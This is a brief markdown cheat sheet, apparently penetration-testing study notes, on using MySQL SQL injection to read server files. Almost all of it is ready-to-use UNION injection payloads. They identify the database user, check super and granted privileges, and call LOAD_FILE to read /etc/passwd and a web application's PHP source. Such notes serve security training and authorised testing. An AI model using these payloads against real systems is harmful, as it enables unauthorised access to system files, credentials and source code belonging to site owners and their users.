# Reading Files
***

### Privileges
#### In MySQL, the database user must have the **FILE** privilege to load a file's content into a table and them exfiltrate data from that table and read files.
#### We first need to gather information about our user privileges within the database to decide whether we will read and/or write files to the back-end server


### DB User
#### Used to determine which user we are within the database
#### Examples:
```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT user from mysql.user;
```
#### Using  UNION:
```sql
v' UNION SELECT 1,user, 3, 4 FROM mysql.user-- 
```
```sql
v' UNION SELECT 1,user(), 3, 4-- 
```

### User Privileges
#### We can use the following queries to check if we have super admin privileges:
```sql
SELECT super_priv FROM mysql.user;
```
#### Or using UNION
```sql
v' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
```

```sql
v' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
```

#### If we have super admin privileges the query will return Y 

#### Dumping all privileges :
```sql
v' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```

#### Of a given user:
```sql
v' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
```

### LOAD_FILE
#### The LOAD_FILE function can be used in MySQL/MariaDB to read data from files
#### Example:
```sql
SELECT LOAD_FILE('/etc/passwd');
```

#### Using UNION:
```sql
v' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```

#### Another Example:
```sql
v' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
```
##### **NOTE**: The default Apache webroot is ***/var/www/html*** so we can try and load a file to read his source code